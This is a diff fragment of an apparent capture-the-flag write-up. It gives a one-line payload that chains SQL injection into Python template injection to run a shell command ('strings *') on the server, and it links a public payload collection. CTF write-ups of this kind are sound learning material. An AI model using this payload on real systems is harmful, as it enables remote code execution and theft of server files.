@@ -46,9 +46,7 @@ That means the data we insert is used in a raw SQL query → classic SQLi.
  One-Liner Payload (SQLi → SSTI)
  In the bookmark input field:
 <pre>' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('strings *').read() }}" -- </pre>
-  (You can also just dump everything with strings * and Ctrl+F for the flag – lazy but works.)
-
-  <pre>Payload References: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md</pre>
+<pre>Payload References: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md</pre>
 
 ---
 
